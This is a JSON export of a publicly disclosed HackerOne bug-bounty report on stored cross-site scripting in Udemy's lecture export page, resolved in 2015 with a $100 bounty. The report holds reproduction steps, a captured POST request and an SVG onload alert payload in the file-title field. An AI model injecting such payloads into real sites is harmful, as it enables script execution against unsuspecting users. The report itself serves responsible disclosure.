{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2015-09-08T04:05:19.985Z", 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "100.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 62400, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "XSS on https://www.udemy.com/asset/export.html", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2015-10-08T04:05:20.349Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$100", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-05-20T23:45:19.547Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-20T23:45:19.547Z", 
            "actor": {
                "username": "udemybugs", 
                "url": "/udemybugs", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/844/a689f61f0fc67e70bc6c42e519375f03698357ae_medium.png?1433175299"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "udemy", 
            "message": "We appreciate the time you took to submit this bug report. Due to the high volume of incoming reports, there is a delay in handling incoming security reports, please bear with us!\n\nI have triaged this report.", 
            "markdown_message": "<p>We appreciate the time you took to submit this bug report. Due to the high volume of incoming reports, there is a delay in handling incoming security reports, please bear with us!</p>\n\n<p>I have triaged this report.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 425416, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "adrianbelen", 
                "url": "/adrianbelen"
            }, 
            "created_at": "2015-08-14T18:59:25.742Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-08-14T18:59:25.742Z", 
            "actor": {
                "username": "udemybugs", 
                "url": "/udemybugs", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/844/a689f61f0fc67e70bc6c42e519375f03698357ae_medium.png?1433175299"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "udemy", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 549018, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-09-08T04:05:20.064Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-09-08T04:05:20.064Z", 
            "actor": {
                "username": "adrianbelen", 
                "url": "/adrianbelen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/531/94005188087ec480a29b0e62ba0e9e9f06c9b801_medium.jpg?1518137520"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "udemy", 
            "first_to_agree": true, 
            "message": "hi!", 
            "markdown_message": "<p>hi!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 580392, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-09-09T18:53:42.780Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-09-09T18:53:42.780Z", 
            "actor": {
                "url": "/udemy", 
                "profile": {
                    "name": "Udemy"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/566/c6c0444dc4821b905e04800af06fff7d2b9ad349_medium.png?1508982395"
                }
            }, 
            "team_handle": "udemy", 
            "bounty_amount": "100.0", 
            "collaborator": {
                "username": "adrianbelen", 
                "url": "/adrianbelen"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 582972, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-10-08T04:05:34.947Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-08T04:05:34.947Z", 
            "actor": {
                "url": "/udemy", 
                "profile": {
                    "name": "Udemy"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/566/c6c0444dc4821b905e04800af06fff7d2b9ad349_medium.png?1508982395"
                }
            }, 
            "team_handle": "udemy", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 613593, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "adrianbelen", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/adrianbelen", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/531/b3140d6afe86fda01cfc7219be9e4a0e9f855ea4_small.jpg?1518137520"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 60, 
        "name": "Cross-site Scripting (XSS) - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -99860008.30873221, 
    "disclosed_at": "2015-10-08T04:05:34.907Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/62400", 
    "created_at": "2015-05-14T14:19:17.104Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"description\">Description</h2>\n\n<p><a title=\"https://www.udemy.com/asset/export.html\" href=\"/redirect?signature=d802c90f479b4999718206a7382129f1a40b9a4b&amp;url=https%3A%2F%2Fwww.udemy.com%2Fasset%2Fexport.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.udemy.com/asset/export.html</span><i class=\"icon-external-link\"></i></a> is used to generate a content of a lecture and it will be dispalyed on <a title=\"https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf\" href=\"/redirect?signature=2631f8d55b4063fe388dcbfe373befe9a7d853a3&amp;url=https%3A%2F%2Fwww.udemy.com%2Fstaticx%2Fudemy%2Fflash%2Fudemypresentation.player.swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf</span><i class=\"icon-external-link\"></i></a>?.<br>\n<a title=\"https://www.udemy.com/asset/export.html\" href=\"/redirect?signature=d802c90f479b4999718206a7382129f1a40b9a4b&amp;url=https%3A%2F%2Fwww.udemy.com%2Fasset%2Fexport.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.udemy.com/asset/export.html</span><i class=\"icon-external-link\"></i></a> contain <code>json response</code> but the content type is <code>text/html</code>, allowing the browser to render some <code>html tag</code></p>\n\n<p><strong>Step to Reproduces</strong></p>\n\n<ul>\n<li>create a new course then go to <code>curriculum tab</code>, <a title=\"https://www.udemy.com/course-manage/edit-curriculum?courseId=ID_here\" href=\"/redirect?signature=fdeba77899a756102310eb698d4f146b43e36596&amp;url=https%3A%2F%2Fwww.udemy.com%2Fcourse-manage%2Fedit-curriculum%3FcourseId%3DID_here\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.udemy.com/course-manage/edit-curriculum?courseId=ID_here</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>on  lecture add new content then select presentation, the <a title=\"https://www.udemy.com/upload/\" href=\"/redirect?signature=7551bb57dc18c30b01038b9826b2beb98b169cd0&amp;url=https%3A%2F%2Fwww.udemy.com%2Fupload%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.udemy.com/upload/</span><i class=\"icon-external-link\"></i></a> will upload your pdf file.</li>\n<li>after the uploading process the new file will be added to your <code>Lecture</code> by sending a request in this url \n<a title=\"https://www.udemy.com/asset/add-submit/?type=Presentation\" href=\"/redirect?signature=2dbc23e912e2fc6870a1fa564cf8e20dd5744c83&amp;url=https%3A%2F%2Fwww.udemy.com%2Fasset%2Fadd-submit%2F%3Ftype%3DPresentation\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.udemy.com/asset/add-submit/?type=Presentation</span><i class=\"icon-external-link\"></i></a> containing the <code>file</code> and the <code>file title</code>.\nthe vulnerable parameter is the <code>file title</code> <strong>so put your XSS payload on this parameter</strong>\n</li>\n</ul>\n\n<p><strong>Dump Request</strong></p>\n\n<p><code>POST /asset/add-submit/?type=Presentation HTTP/1.1<br>\nHost: www.udemy.com<br>\nConnection: keep-alive<br>\nContent-Length: 301<br>\nAccept: application/json, text/javascript, */*; q=0.01<br>\nX-NewRelic-ID: XAcEWV5ADQIBUlNW<br>\nOrigin: https://www.udemy.com<br>\nX-Requested-With: XMLHttpRequest<br>\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36<br>\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8<br>\nDNT: 1<br>\nReferer: https://www.udemy.com/course-manage/edit-curriculum?courseId=497324<br>\nAccept-Encoding: gzip, deflate<br>\nAccept-Language: en-US,en;q=0.8,et;q=0.6,fil;q=0.4</code></p>\n\n<h2 id=\"removed-cookie\">(removed cookie)</h2>\n\n<p><code>type=Presentation&amp;title=&quot;&gt;&lt;svg/onload=javascript:alert(2);&gt;Neglected+DNS+Records+Exploited+To+Takeover+Subdomains+Yassine+ABOUKIR&amp;isSubmitted=1&amp;csrf=dc5d07dd336b1ab185623b1f83fd932e&amp;file=2015-05-14_06-09-55__Neglected_DNS_records_exploited_to_takeover_subdomains___Yassine_ABOUKIR.pdf&amp;displayType=ajax</code></p>\n\n<ul>\n<li>now preview the lecture as instructor or student, the flash file (<a title=\"https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf\" href=\"/redirect?signature=2631f8d55b4063fe388dcbfe373befe9a7d853a3&amp;url=https%3A%2F%2Fwww.udemy.com%2Fstaticx%2Fudemy%2Fflash%2Fudemypresentation.player.swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf</span><i class=\"icon-external-link\"></i></a>) will generate a request on this endpoint -&gt; <a title=\"https://www.udemy.com/asset/export.html\" href=\"/redirect?signature=d802c90f479b4999718206a7382129f1a40b9a4b&amp;url=https%3A%2F%2Fwww.udemy.com%2Fasset%2Fexport.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.udemy.com/asset/export.html</span><i class=\"icon-external-link\"></i></a> which is vulnerable to XSS </li>\n</ul>\n\n<h3 id=\"working-poc\">Working PoC</h3>\n\n<p><a title=\"https://www.udemy.com/asset/export.html?displayType=json&amp;uaid=E0AYcFhSR3oT&amp;uaidh=bffae6ad200b35970a667b0e2baab6e5&amp;ulid=E0ESc1laTHgT&amp;ulidh=1c92156b2841b96203cfb7f464fe4f18&amp;uuid=E0ofdFZaQ3QT&amp;uuidh=b1e2facab92aeba9d7f6936302ebf022\" href=\"/redirect?signature=e7885fbc9dd97f9f46a2b0b00378f912531e79b0&amp;url=https%3A%2F%2Fwww.udemy.com%2Fasset%2Fexport.html%3FdisplayType%3Djson%26uaid%3DE0AYcFhSR3oT%26uaidh%3Dbffae6ad200b35970a667b0e2baab6e5%26ulid%3DE0ESc1laTHgT%26ulidh%3D1c92156b2841b96203cfb7f464fe4f18%26uuid%3DE0ofdFZaQ3QT%26uuidh%3Db1e2facab92aeba9d7f6936302ebf022\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.udemy.com/asset/export.html?displayType=json&amp;uaid=E0AYcFhSR3oT&amp;uaidh=bffae6ad200b35970a667b0e2baab6e5&amp;ulid=E0ESc1laTHgT&amp;ulidh=1c92156b2841b96203cfb7f464fe4f18&amp;uuid=E0ofdFZaQ3QT&amp;uuidh=b1e2facab92aeba9d7f6936302ebf022</span><i class=\"icon-external-link\"></i></a></p>\n", 
    "vulnerability_information": "##Description\r\nhttps://www.udemy.com/asset/export.html is used to generate a content of a lecture and it will be dispalyed on https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf?.\r\nhttps://www.udemy.com/asset/export.html contain `json response` but the content type is `text/html`, allowing the browser to render some `html tag`\r\n\r\n**Step to Reproduces**\r\n\r\n* create a new course then go to `curriculum tab`, https://www.udemy.com/course-manage/edit-curriculum?courseId=ID_here\r\n* on  lecture add new content then select presentation, the https://www.udemy.com/upload/ will upload your pdf file.\r\n* after the uploading process the new file will be added to your `Lecture` by sending a request in this url \r\nhttps://www.udemy.com/asset/add-submit/?type=Presentation containing the `file` and the `file title`.\r\nthe vulnerable parameter is the `file title` **so put your XSS payload on this parameter**\r\n\r\n**Dump Request**\r\n\r\n`POST /asset/add-submit/?type=Presentation HTTP/1.1\r\nHost: www.udemy.com\r\nConnection: keep-alive\r\nContent-Length: 301\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nX-NewRelic-ID: XAcEWV5ADQIBUlNW\r\nOrigin: https://www.udemy.com\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nDNT: 1\r\nReferer: https://www.udemy.com/course-manage/edit-curriculum?courseId=497324\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.8,et;q=0.6,fil;q=0.4`\r\n\r\n##(removed cookie)\r\n`type=Presentation&title=\"><svg/onload=javascript:alert(2);>Neglected+DNS+Records+Exploited+To+Takeover+Subdomains+Yassine+ABOUKIR&isSubmitted=1&csrf=dc5d07dd336b1ab185623b1f83fd932e&file=2015-05-14_06-09-55__Neglected_DNS_records_exploited_to_takeover_subdomains___Yassine_ABOUKIR.pdf&displayType=ajax`\r\n\r\n* now preview the lecture as instructor or student, the flash file (https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf) will generate a request on this endpoint -> https://www.udemy.com/asset/export.html which is vulnerable to XSS \r\n\r\n\r\n###Working PoC\r\n https://www.udemy.com/asset/export.html?displayType=json&uaid=E0AYcFhSR3oT&uaidh=bffae6ad200b35970a667b0e2baab6e5&ulid=E0ESc1laTHgT&ulidh=1c92156b2841b96203cfb7f464fe4f18&uuid=E0ofdFZaQ3QT&uuidh=b1e2facab92aeba9d7f6936302ebf022", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://udemy.com", 
            "about": "We\u2019re the world\u2019s online learning marketplace, with courses in everything from programming to yoga to photography.", 
            "twitter_handle": "", 
            "name": "Udemy"
        }, 
        "handle": "udemy", 
        "url": "https://hackerone.com/udemy", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/566/28faac3f5b68305a31ed8a187fd5bbe8b4935079_small.png?1508982395", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/566/c6c0444dc4821b905e04800af06fff7d2b9ad349_medium.png?1508982395"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1566, 
        "default_currency": "usd"
    }, 
    "is_published": false
}